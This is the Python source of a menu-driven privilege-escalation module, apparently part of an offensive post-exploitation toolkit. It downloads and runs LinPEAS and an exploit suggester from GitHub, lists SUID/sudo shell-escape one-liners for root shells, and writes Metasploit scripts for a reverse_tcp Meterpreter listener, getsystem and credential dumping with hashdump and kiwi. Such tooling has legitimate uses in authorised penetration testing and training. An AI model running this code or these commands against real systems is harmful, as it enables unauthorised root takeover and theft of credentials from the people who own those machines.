#!/usr/bin/env python3
# app/post_exploitation/privilege_escalation.py

import os
import sys
import subprocess
import platform
import time

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, BASE_DIR)

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE
from utils import Logger, pause, InputValidator, clear_screen, CommandRunner


class Terminal:
    MARGIN = 4
    
    @staticmethod
    def print_margin(text=""):
        margin = ' ' * Terminal.MARGIN
        if text:
            print(margin + text)
        else:
            print()


class PrivilegeEscalation:
    def __init__(self):
        self.os_type = platform.system().lower()
    
    def show_header(self):
        clear_screen()
        Terminal.print_margin()
        Terminal.print_margin(f"{C_TITLE}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}â•‘      PRIVILEGE ESCALATION TOOLKIT     â•‘{C_RESET}")
        Terminal.print_margin(f"{C_TITLE}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{C_RESET}")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_INFO}  Detected OS: {self.os_type.upper()}{C_RESET}")
        Terminal.print_margin()
    
    def run(self):
        while True:
            self.show_header()
            
            Terminal.print_margin(f"{C_TITLE}â”Œâ”€ PRIVILEGE ESCALATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  LOCAL PRIVILEGE ESCALATION:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [1]  Automated Enumeration (LinPEAS/WinPEAS){C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [2]  Quick SUID/SGID Scanner{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [3]  Sudo Privilege Checker{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [4]  Writable Files/Folders Hunter{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [5]  Linux Exploit Suggester{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  REMOTE PRIVILEGE ESCALATION:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [6]  Metasploit Auto Privilege Escalation{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [7]  Meterpreter Session Handler{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}  RESOURCES:{C_RESET}")
            Terminal.print_margin(f"{C_INFO}  [8]  GTFOBins Interactive Search{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_WARN}  [0]  Back{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_TITLE}â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜{C_RESET}")
            Terminal.print_margin()
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.automated_enumeration()
            elif choice == '2':
                self.suid_scanner()
            elif choice == '3':
                self.sudo_checker()
            elif choice == '4':
                self.writable_hunter()
            elif choice == '5':
                self.exploit_suggester()
            elif choice == '6':
                self.metasploit_auto_privesc()
            elif choice == '7':
                self.meterpreter_handler()
            elif choice == '8':
                self.gtfobins_interactive()
            else:
                Logger.error("Invalid choice!")
                time.sleep(0.5)
    
    # ==================== LOCAL PRIVILEGE ESCALATION ====================
    
    def automated_enumeration(self):
        """Automated enumeration with LinPEAS/WinPEAS"""
        self.show_header()
        Logger.info("Automated Privilege Escalation Enumeration")
        Terminal.print_margin()
        
        if self.os_type == 'linux':
            Logger.info("Detected: LINUX")
            Terminal.print_margin()
            Logger.info("Starting LinPEAS enumeration...")
            Terminal.print_margin()
            
            # Check if LinPEAS exists
            linpeas_path = "/tmp/linpeas.sh"
            
            if not os.path.exists(linpeas_path):
                Logger.warning("LinPEAS not found locally")
                Terminal.print_margin()
                
                if InputValidator.confirm("Download LinPEAS now?"):
                    Logger.info("Downloading LinPEAS...")
                    linpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
                    
                    cmd = f"curl -L {linpeas_url} -o {linpeas_path}"
                    returncode, stdout, stderr = CommandRunner.run(cmd, shell=True, timeout=60)
                    
                    if returncode == 0:
                        os.chmod(linpeas_path, 0o755)
                        Logger.success("LinPEAS downloaded successfully!")
                    else:
                        Logger.error("Download failed!")
                        Logger.info("Manual download:")
                        Terminal.print_margin(f"  wget {linpeas_url} -O {linpeas_path}")
                        pause()
                        return
                else:
                    pause()
                    return
            
            Logger.info("Running LinPEAS... (This may take 2-5 minutes)")
            Terminal.print_margin()
            pause("Press Enter to start...")
            
            # Run LinPEAS
            os.system(f"bash {linpeas_path}")
            
            Terminal.print_margin()
            Logger.success("LinPEAS scan completed!")
            
        elif self.os_type == 'windows':
            Logger.info("Detected: WINDOWS")
            Terminal.print_margin()
            
            winpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
            
            Logger.info("WinPEAS must be run on target Windows machine")
            Terminal.print_margin()
            Logger.info("Download command:")
            Terminal.print_margin(f"  Invoke-WebRequest -Uri {winpeas_url} -OutFile winpeas.exe")
            Terminal.print_margin()
            Logger.info("Then run:")
            Terminal.print_margin(f"  .\\winpeas.exe")
            
        else:
            Logger.warning(f"OS {self.os_type} not supported")
        
        pause()
    
    def suid_scanner(self):
        """Quick SUID/SGID scanner with exploitation tips"""
        if self.os_type != 'linux':
            Logger.warning("This feature is for Linux only!")
            pause()
            return
        
        self.show_header()
        Logger.info("SUID/SGID Binary Scanner")
        Terminal.print_margin()
        Logger.warning("Scanning entire filesystem... This may take time")
        Terminal.print_margin()
        
        if not InputValidator.confirm("Start scan?"):
            return
        
        Logger.info("Searching for SUID binaries (4000)...")
        Terminal.print_margin()
        
        # Run find and capture output
        cmd = "find / -perm -4000 -type f 2>/dev/null"
        returncode, stdout, stderr = CommandRunner.run(cmd, shell=True, timeout=120)
        
        if returncode == 0 and stdout:
            suid_files = stdout.strip().split('\n')
            
            Logger.success(f"Found {len(suid_files)} SUID binaries:")
            Terminal.print_margin()
            
            # Display results
            for idx, file in enumerate(suid_files, 1):
                print(f"  {idx:3d}. {file}")
            
            Terminal.print_margin()
            
            # Check for exploitable binaries
            exploitable = ['nmap', 'vim', 'find', 'bash', 'more', 'less', 'nano', 'cp', 'mv', 'awk', 'python', 'perl', 'ruby']
            
            found_exploitable = []
            for file in suid_files:
                for binary in exploitable:
                    if binary in file.lower():
                        found_exploitable.append((file, binary))
            
            if found_exploitable:
                Logger.warning("âš ï¸  POTENTIALLY EXPLOITABLE BINARIES FOUND!")
                Terminal.print_margin()
                
                for file, binary in found_exploitable:
                    Terminal.print_margin(f"{C_ERR}[!] {file}{C_RESET}")
                    Terminal.print_margin(f"    Binary: {binary}")
                    Terminal.print_margin(f"    Check: https://gtfobins.github.io/gtfobins/{binary}/")
                    Terminal.print_margin()
                
                Terminal.print_margin()
                if InputValidator.confirm("Show exploitation examples?"):
                    self.show_suid_exploits(found_exploitable)
            
        else:
            Logger.error("Scan failed or no results found")
        
        pause()
    
    def show_suid_exploits(self, exploitable_list):
        """Show SUID exploitation examples"""
        Terminal.print_margin()
        Logger.info("SUID Exploitation Examples:")
        Terminal.print_margin()
        
        exploits = {
            'nmap': 'nmap --interactive\n!sh',
            'vim': 'vim -c \':!/bin/sh\'',
            'find': 'find . -exec /bin/sh -p \\; -quit',
            'bash': 'bash -p',
            'more': 'more /etc/passwd\n!/bin/sh',
            'less': 'less /etc/passwd\n!/bin/sh',
            'awk': 'awk \'BEGIN {system("/bin/sh")}\'',
            'python': 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
        }
        
        for file, binary in exploitable_list[:3]:  # Show first 3
            if binary in exploits:
                Terminal.print_margin(f"{C_OK}[+] Exploit for {binary}:{C_RESET}")
                Terminal.print_margin(f"    {exploits[binary]}")
                Terminal.print_margin()
    
    def sudo_checker(self):
        """Interactive sudo privilege checker"""
        if self.os_type != 'linux':
            Logger.warning("This feature is for Linux only!")
            pause()
            return
        
        self.show_header()
        Logger.info("Sudo Privilege Checker")
        Terminal.print_margin()
        
        Logger.info("Checking sudo privileges...")
        Terminal.print_margin()
        
        # Run sudo -l
        cmd = "sudo -l"
        Logger.info(f"Running: {cmd}")
        Terminal.print_margin()
        
        returncode = os.system(cmd)
        
        Terminal.print_margin()
        
        if returncode == 0:
            Terminal.print_margin()
            Logger.info("ðŸ’¡ Tips:")
            Terminal.print_margin("  â€¢ If you see (ALL : ALL) ALL - you can run ANY command as root!")
            Terminal.print_margin("  â€¢ Check GTFOBins for sudo exploitation of listed binaries")
            Terminal.print_margin("  â€¢ Look for NOPASSWD entries")
            Terminal.print_margin()
            
            if InputValidator.confirm("Search GTFOBins for sudo exploits?"):
                self.gtfobins_interactive()
        else:
            Logger.warning("Cannot check sudo privileges (might need password)")
        
        pause()
    
    def writable_hunter(self):
        """Hunt for writable files and directories"""
        if self.os_type != 'linux':
            Logger.warning("This feature is for Linux only!")
            pause()
            return
        
        self.show_header()
        Logger.info("Writable Files & Folders Hunter")
        Terminal.print_margin()
        
        Logger.info("What to search?")
        Terminal.print_margin("  [1] Writable directories in /etc")
        Terminal.print_margin("  [2] World-writable files")
        Terminal.print_margin("  [3] Files owned by current user")
        Terminal.print_margin("  [4] All of the above")
        Terminal.print_margin()
        
        choice = InputValidator.get_choice()
        
        Terminal.print_margin()
        Logger.info("Searching... Please wait")
        Terminal.print_margin()
        
        if choice in ['1', '4']:
            Logger.info("[1] Writable directories in /etc:")
            os.system("find /etc -writable -type d 2>/dev/null")
            Terminal.print_margin()
        
        if choice in ['2', '4']:
            Logger.info("[2] World-writable files:")
            os.system("find / -perm -002 -type f 2>/dev/null | head -n 20")
            Terminal.print_margin()
        
        if choice in ['3', '4']:
            Logger.info("[3] Files owned by current user:")
            current_user = os.getenv('USER')
            os.system(f"find / -user {current_user} -type f 2>/dev/null | head -n 30")
            Terminal.print_margin()
        
        Logger.success("Search completed!")
        pause()
    
    def exploit_suggester(self):
        """Linux Exploit Suggester - automated"""
        if self.os_type != 'linux':
            Logger.warning("This is for Linux only!")
            pause()
            return
        
        self.show_header()
        Logger.info("Linux Exploit Suggester")
        Terminal.print_margin()
        
        les_path = "/tmp/linux-exploit-suggester.sh"
        les_url = "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh"
        
        # Check if exists
        if not os.path.exists(les_path):
            Logger.info("Downloading Linux Exploit Suggester...")
            cmd = f"curl -L {les_url} -o {les_path}"
            returncode, stdout, stderr = CommandRunner.run(cmd, shell=True, timeout=30)
            
            if returncode == 0:
                os.chmod(les_path, 0o755)
                Logger.success("Downloaded successfully!")
            else:
                Logger.error("Download failed!")
                pause()
                return
        
        Logger.info("Running exploit suggester...")
        Terminal.print_margin()
        pause("Press Enter to start...")
        
        # Run it
        os.system(f"bash {les_path}")
        
        Terminal.print_margin()
        Logger.success("Scan completed!")
        Logger.info("Review the suggested exploits above")
        
        pause()
    
    # ==================== REMOTE PRIVILEGE ESCALATION ====================
    
    def metasploit_auto_privesc(self):
        """Automated Metasploit privilege escalation"""
        self.show_header()
        Logger.info("Metasploit Auto Privilege Escalation")
        Terminal.print_margin()
        
        Logger.info("This will guide you through automated privilege escalation")
        Terminal.print_margin()
        
        # Step 1: Check msfconsole
        if not CommandRunner.check_tool('msfconsole'):
            Logger.error("Metasploit not installed!")
            Logger.info("Install: sudo apt install metasploit-framework")
            pause()
            return
        
        Logger.success("Metasploit detected!")
        Terminal.print_margin()
        
        # Step 2: Get session ID
        session_id = input(f"{C_INFO}Enter your Meterpreter session ID (e.g., 1): {C_RESET}").strip()
        
        if not session_id.isdigit():
            Logger.error("Invalid session ID!")
            pause()
            return
        
        Terminal.print_margin()
        Logger.info("Creating automated privilege escalation script...")
        
        # Create RC script
        rc_script = f"""
# Automated Privilege Escalation Script
sessions -i {session_id}
getuid
sysinfo

# Try getsystem
getsystem

# Check if successful
getuid

# If failed, run exploit suggester
background
use post/multi/recon/local_exploit_suggester
set SESSION {session_id}
run

# Show results
sessions -i {session_id}
getuid
"""
        
        rc_file = "/tmp/auto_privesc.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_script)
        
        Logger.success(f"Script created: {rc_file}")
        Terminal.print_margin()
        
        Logger.info("Script will:")
        Terminal.print_margin("  1. Connect to your session")
        Terminal.print_margin("  2. Try automatic getsystem")
        Terminal.print_margin("  3. Run exploit suggester if needed")
        Terminal.print_margin("  4. Show results")
        Terminal.print_margin()
        
        if InputValidator.confirm("Run automated privilege escalation?"):
            Logger.info("Starting Metasploit...")
            cmd = f"msfconsole -q -r {rc_file}"
            os.system(cmd)
        
        pause()
    
    def meterpreter_handler(self):
        """Interactive Meterpreter privilege escalation handler"""
        self.show_header()
        Logger.info("Meterpreter Privilege Escalation Handler")
        Terminal.print_margin()
        
        Logger.info("Choose action:")
        Terminal.print_margin("  [1] Setup Listener (Handler)")
        Terminal.print_margin("  [2] Interact with Session")
        Terminal.print_margin("  [3] Privilege Escalation Commands")
        Terminal.print_margin("  [4] Credential Dumping")
        Terminal.print_margin("  [0] Back")
        Terminal.print_margin()
        
        choice = InputValidator.get_choice()
        
        if choice == '1':
            self.setup_listener()
        elif choice == '2':
            self.interact_session()
        elif choice == '3':
            self.privesc_commands()
        elif choice == '4':
            self.credential_dumping()
    
    def setup_listener(self):
        """Setup Metasploit listener"""
        Terminal.print_margin()
        Logger.info("Setting up Metasploit Listener")
        Terminal.print_margin()
        
        lhost = input(f"{C_INFO}Your IP (LHOST): {C_RESET}").strip()
        lport = input(f"{C_INFO}Your Port (LPORT) [4444]: {C_RESET}").strip() or "4444"
        
        rc_script = f"""
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
        
        rc_file = "/tmp/handler.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_script)
        
        Logger.success("Listener configuration created!")
        Terminal.print_margin()
        Logger.info(f"Starting listener on {lhost}:{lport}...")
        
        pause("Press Enter to start...")
        os.system(f"msfconsole -q -r {rc_file}")
    
    def interact_session(self):
        """Interact with Meterpreter session"""
        Terminal.print_margin()
        
        session_id = input(f"{C_INFO}Session ID: {C_RESET}").strip()
        
        if not session_id.isdigit():
            Logger.error("Invalid session ID!")
            pause()
            return
        
        Logger.info(f"Connecting to session {session_id}...")
        
        rc_script = f"""
sessions -i {session_id}
"""
        
        rc_file = "/tmp/interact.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_script)
        
        os.system(f"msfconsole -q -r {rc_file}")
    
    def privesc_commands(self):
        """Show privilege escalation commands"""
        Terminal.print_margin()
        Logger.info("Privilege Escalation Commands:")
        Terminal.print_margin()
        
        commands = [
            ("Check user", "getuid"),
            ("System info", "sysinfo"),
            ("Auto escalate", "getsystem"),
            ("List processes", "ps"),
            ("Migrate process", "migrate <PID>"),
            ("Suggest exploits", "run post/multi/recon/local_exploit_suggester"),
        ]
        
        for desc, cmd in commands:
            Terminal.print_margin(f"{C_OK}[+] {desc:20s}{C_RESET} â†’ {cmd}")
        
        pause()
    
    def credential_dumping(self):
        """Credential dumping commands"""
        Terminal.print_margin()
        Logger.info("Credential Dumping:")
        Terminal.print_margin()
        
        session_id = input(f"{C_INFO}Session ID: {C_RESET}").strip()
        
        if not session_id.isdigit():
            Logger.error("Invalid session ID!")
            pause()
            return
        
        rc_script = f"""
sessions -i {session_id}
getuid
hashdump
load kiwi
creds_all
"""
        
        rc_file = "/tmp/dump_creds.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_script)
        
        Logger.info("Starting credential dump...")
        pause("Press Enter to continue...")
        
        os.system(f"msfconsole -q -r {rc_file}")
    
    # ==================== RESOURCES ====================
    
    def gtfobins_interactive(self):
        """Interactive GTFOBins search"""
        self.show_header()
        Logger.info("GTFOBins Interactive Search")
        Terminal.print_margin()
        
        Logger.info("Common exploitable binaries:")
        Terminal.print_margin()
        
        binaries = {
            '1': ('find', 'find . -exec /bin/sh -p \\; -quit'),
            '2': ('vim', 'vim -c \':!/bin/sh\''),
            '3': ('bash', 'bash -p'),
            '4': ('python', 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\''),
            '5': ('perl', 'perl -e \'exec "/bin/sh";\''),
            '6': ('ruby', 'ruby -e \'exec "/bin/sh"\''),
            '7': ('awk', 'awk \'BEGIN {system("/bin/sh")}\''),
            '8': ('nmap', 'nmap --interactive\n!sh'),
        }
        
        for key, (binary, exploit) in binaries.items():
            Terminal.print_margin(f"  [{key}] {binary}")
        
        Terminal.print_margin()
        choice = input(f"{C_INFO}Select binary (or 0 to cancel): {C_RESET}").strip()
        
        if choice in binaries:
            binary, exploit = binaries[choice]
            Terminal.print_margin()
            Logger.success(f"Exploit for {binary}:")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_OK}{exploit}{C_RESET}")
            Terminal.print_margin()
            Logger.info(f"More info: https://gtfobins.github.io/gtfobins/{binary}/")
        
        pause()


if __name__ == "__main__":
    priv_esc = PrivilegeEscalation()
    priv_esc.run()